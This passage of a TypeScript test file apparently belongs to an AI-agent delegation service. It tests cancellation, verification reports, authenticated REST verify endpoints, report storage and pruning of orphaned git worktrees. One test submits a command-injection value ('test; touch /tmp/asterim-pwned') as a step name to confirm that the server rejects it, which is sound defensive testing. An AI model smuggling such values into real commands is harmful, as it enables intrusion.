    equal('and it is the one it named', subset.verificationReport.steps[0].name, 'test');

    // An operator stopping a runaway agent is waiting on that request, and it
    // answers with whatever the delegation settles as. Verifying abandoned work
    // first would make the cancel button take as long as a build.
    runner.reply = null;
    const pending = delegation.delegateTask({
      parentThreadId: 'verify-lead',
      targetRole: 'Senior Backend Engineer',
      taskDescription: 'Never finishes.',
      timeoutMs: 600000
    });
    await new Promise(resolve => setTimeout(resolve, 30));
    const startedAt = Date.now();
    const cancelled = await delegation.cancelDelegation('verify-lead', 'Going nowhere.');
    await pending;

    equal('a cancelled delegation is not verified', cancelled.verificationReport, undefined);
    check('and the cancellation answers at once', Date.now() - startedAt < 3000);
  }

  describe('a project with no pipeline delegates exactly as it did before');
  {
    const plainRepo = makeRepo('plain-repo').dir;
    dbService
      .getDb()
      .prepare('INSERT INTO projects (id, name, path) VALUES (?, ?, ?)')
      .run('plain-project', 'Plain', plainRepo);
    dbService
      .getDb()
      .prepare('INSERT INTO threads (id, project_id, name) VALUES (?, ?, ?)')
      .run('plain-lead', 'plain-project', 'Plain lead');

    runner.reset();
    runner.reply = (threadId: string) => {
      emitAgentMessage('plain-project', threadId, 'SUMMARY: Did the work.\n');
      emitStatus('plain-project', threadId, 'idle');
    };

    const result = await delegation.delegateTask({
      parentThreadId: 'plain-lead',
      targetRole: 'Senior Backend Engineer',
      taskDescription: 'Work in a project nobody configured.'
    });

    equal('it completed', result.status, 'COMPLETED');
    equal('a report still comes back', typeof result.verificationReport, 'object');
    equal('saying nothing was discovered', result.verificationReport.totalSteps, 0);
    equal('which is not a pass', result.verificationReport.passed, false);
    check(
      'and the parent is told exactly that, rather than that something failed',
      runner.sentTo('plain-lead')[0].includes('no verification pipeline was discovered')
    );
  }

  describe('the report the parent reads');
  {
    const report = formatDelegationReport({
      childThreadId: 'child-1',
      status: 'COMPLETED',
      summary: 'Everything passed.',
      output: '',
      role: 'QA Engineer',
      worktreePath: '/tmp/sandbox',
      changedFiles: ['a.ts'],
      verificationReport: {
        passed: false,
        totalSteps: 2,
        passedSteps: 1,
        failedSteps: 1,
        durationMs: 1200,
        executedAt: Date.now(),
        cwd: '/tmp/sandbox',
        steps: [
          { name: 'typecheck', command: 'pnpm run typecheck', passed: true, exitCode: 0, durationMs: 500 },
          {
            name: 'test',
            command: 'pnpm run test',
            passed: false,
            exitCode: 1,
            durationMs: 700,
            stderrSummary: 'FAIL src/x.test.ts — expected 2, got 3'
          }
        ]
      }
    });

    check('carries the verdict', report.includes('VERIFICATION: 1 of 2 steps failed'));
    check('names the failing step', report.includes('test — pnpm run test (exit 1)'));
    check('with the evidence behind it', report.includes('expected 2, got 3'));
    check('and does not tell the parent to carry on', !report.includes('Continue from this result'));

    const green = formatDelegationReport({
      childThreadId: 'child-2',
      status: 'COMPLETED',
      summary: 'Done.',
      output: '',
      verificationReport: {
        passed: true,
        totalSteps: 1,
        passedSteps: 1,
        failedSteps: 0,
        durationMs: 100,
        executedAt: Date.now(),
        cwd: '/tmp/sandbox',
        steps: [{ name: 'test', command: 'pnpm run test', passed: true, exitCode: 0, durationMs: 100 }]
      }
    });
    check('a verified delegation reads as one', green.includes('1/1 steps passed'));
    check('and the parent is told to continue', green.includes('Continue from this result'));
  }

  // --- The REST surface ------------------------------------------------------------

  describe('POST and GET /api/v1/threads/:id/worktree/verify');
  {
    const app = Fastify();
    // Stands in for authMiddleware, which is registered globally in index.ts.
    app.addHook('onRequest', async (request: { headers: Record<string, string>; user?: unknown }) => {
      if (request.headers['x-anonymous'] !== 'yes') request.user = { id: 'test-user' };
    });
    await app.register(worktreeRoutes);
    await app.ready();

    const anonymous = await app.inject({
      method: 'POST',
      url: '/api/v1/threads/verify-lead/worktree/verify',
      headers: { 'x-anonymous': 'yes' }
    });
    equal('an anonymous run is 401', anonymous.statusCode, 401);

    const anonymousRead = await app.inject({
      method: 'GET',
      url: '/api/v1/threads/verify-lead/worktree/verify',
      headers: { 'x-anonymous': 'yes' }
    });
    equal('and so is an anonymous read', anonymousRead.statusCode, 401);

    const ghost = await app.inject({ method: 'POST', url: '/api/v1/threads/ghost/worktree/verify' });
    equal('a thread that does not exist is 404', ghost.statusCode, 404);
    equal('with a code a client can branch on', ghost.json().code, 'THREAD_NOT_FOUND');

    const ghostRead = await app.inject({ method: 'GET', url: '/api/v1/threads/ghost/worktree/verify' });
    equal('reading one is 404 too', ghostRead.statusCode, 404);

    const injected = await app.inject({
      method: 'POST',
      url: '/api/v1/threads/verify-lead/worktree/verify',
      payload: { steps: ['test; touch /tmp/asterim-pwned'] }
    });
    equal('a command dressed up as a step name is 400', injected.statusCode, 400);
    equal('and named as bad input', injected.json().code, 'INVALID_INPUT');
    check('nothing ran', !fs.existsSync('/tmp/asterim-pwned'));

    const badSteps = await app.inject({
      method: 'POST',
      url: '/api/v1/threads/verify-lead/worktree/verify',
      payload: { steps: 'typecheck' }
    });
    equal('steps that are not a list is 400', badSteps.statusCode, 400);

    const badTimeout = await app.inject({
      method: 'POST',
      url: '/api/v1/threads/verify-lead/worktree/verify',
      payload: { timeoutMs: -1 }
    });
    equal('a negative timeout is 400', badTimeout.statusCode, 400);

    // The thread with no sandbox of its own: the project directory is what is
    // verified, which is the answer an operator asking about a lead thread wants.
    const onProject = await app.inject({
      method: 'POST',
      url: '/api/v1/threads/verify-lead/worktree/verify'
    });
    equal('running against a thread with no sandbox is 200', onProject.statusCode, 200);
    equal('and says it was not sandboxed', onProject.json().sandboxed, false);
    equal('the pipeline that ran is the project’s', onProject.json().report.totalSteps, 2);
    equal('in the project directory', onProject.json().report.cwd, delegationRepo);

    const readBack = await app.inject({
      method: 'GET',
      url: '/api/v1/threads/verify-lead/worktree/verify'
    });
    equal('reading it back is 200', readBack.statusCode, 200);
    equal('with the report that was just produced', readBack.json().report.executedAt, onProject.json().report.executedAt);

    const subset = await app.inject({
      method: 'POST',
      url: '/api/v1/threads/verify-lead/worktree/verify',
      payload: { steps: ['test'], timeoutMs: 30000 }
    });
    equal('a subset of steps is 200', subset.statusCode, 200);
    equal('and only those ran', subset.json().report.totalSteps, 1);

    // A thread that has never been verified.
    dbService
      .getDb()
      .prepare('INSERT INTO threads (id, project_id, name) VALUES (?, ?, ?)')
      .run('never-verified', PROJECT_ID, 'Never verified');
    const nothing = await app.inject({
      method: 'GET',
      url: '/api/v1/threads/never-verified/worktree/verify'
    });
    equal('a thread that has never been verified is 200, not 404', nothing.statusCode, 200);
    equal('with nothing in it', nothing.json().report, null);

    await app.close();
  }

  describe('the store keeps one answer per thread');
  {
    const first = await service.runPipeline(scratch('store-a'));
    saveThreadVerificationReport('never-verified', first);
    equal('a report is readable after it is written', loadThreadVerificationReport('never-verified')?.cwd, first.cwd);

    const second = await service.runPipeline(scratch('store-b'));
    saveThreadVerificationReport('never-verified', second);
    equal('and the latest one replaces it', loadThreadVerificationReport('never-verified')?.cwd, second.cwd);

    equal('an unknown thread has no report', loadThreadVerificationReport('ghost'), null);
    equal('and neither has no thread at all', loadThreadVerificationReport(''), null);
  }

  // --- Orphan sandbox pruning --------------------------------------------------------

  describe('pruneOrphanSandboxes reclaims what nothing is using');
  {
    const { dir: pruneRepo } = makeRepo('prune-repo');
    dbService
      .getDb()
      .prepare('INSERT INTO projects (id, name, path) VALUES (?, ?, ?)')
      .run('prune-project', 'Prune', pruneRepo);

    const abandoned = await gitWorktreeService.createWorktree(pruneRepo, 'prune-abandoned');
    const inReview = await gitWorktreeService.createWorktree(pruneRepo, 'prune-in-review');

    // A finished delegation whose diff has not been looked at yet: the row still
    // names its sandbox, and the sandbox is still on disk.
    dbService
      .getDb()
      .prepare(
        'INSERT INTO threads (id, project_id, name, worktree_path, worktree_branch) VALUES (?, ?, ?, ?, ?)'
      )
      .run('prune-in-review', 'prune-project', 'Awaiting review', inReview.path, inReview.branch);

    // And one the Core was killed on top of: git still has it registered, but
    // the directory is gone.
    fs.rmSync(abandoned.path, { recursive: true, force: true });

    const before = await gitWorktreeService.listWorktrees(pruneRepo);
    equal('git has both sandboxes registered to begin with', before.length, 3);

    const pruned = await delegation.pruneOrphanSandboxes();
    check('at least the abandoned one was reclaimed', pruned >= 1, `pruned ${pruned}`);

    const after = await gitWorktreeService.listWorktrees(pruneRepo);
    const paths = after.map((entry: { path: string }) => path.resolve(entry.path));
    check(
      'the sandbox whose directory was gone is no longer registered',
      !paths.includes(path.resolve(abandoned.path))
    );
    check(
      'the one waiting to be reviewed is untouched',
      paths.includes(path.resolve(inReview.path)) && fs.existsSync(inReview.path)
    );
    check('and its branch survives', !!(await gitWorktreeService.getWorktree(pruneRepo, 'prune-in-review')));

    const branches = execSync('git for-each-ref --format="%(refname:short)" refs/heads/', {
      cwd: pruneRepo,
      encoding: 'utf8',
      env: gitEnv
    });
    check('the abandoned sandbox’s branch is gone with it', !branches.includes('prune-abandoned'));
    check('the live one’s is not', branches.includes('prune-in-review'));

    equal('a second pass has nothing left to do', await delegation.pruneOrphanSandboxes(), 0);

    // A project that is not a repository, and one whose directory has gone away
    // entirely, must not be what stops the pass.
    dbService
      .getDb()
      .prepare('INSERT INTO projects (id, name, path) VALUES (?, ?, ?)')
      .run('prune-not-a-repo', 'Not a repo', scratch('not-a-repo'));
    dbService
      .getDb()
      .prepare('INSERT INTO projects (id, name, path) VALUES (?, ?, ?)')
      .run('prune-gone', 'Gone', '/nowhere/at/all');
    equal('pruning is safe over projects it cannot touch', await delegation.pruneOrphanSandboxes(), 0);

    await gitWorktreeService.removeWorktree(pruneRepo, 'prune-in-review');
  }

  describe('the singleton is the same service');
  {
    equal(
      'the exported instance discovers the same way',
      verificationPipelineService.discoverPipeline(scratch('singleton')),
      []
    );
  }
}

main()
  .catch(err => {
    failed++;
    console.error('\nUNCAUGHT ERROR:', err);
  })
  .finally(() => {
    cleanup();
    console.log(`\n${passed}/${passed + failed} assertions passed`);
    if (failures.length > 0) {
      console.log('Failed assertions:');
      for (const f of failures) console.log(`  - ${f}`);
    }
    process.exit(failed === 0 ? 0 : 1);
  });
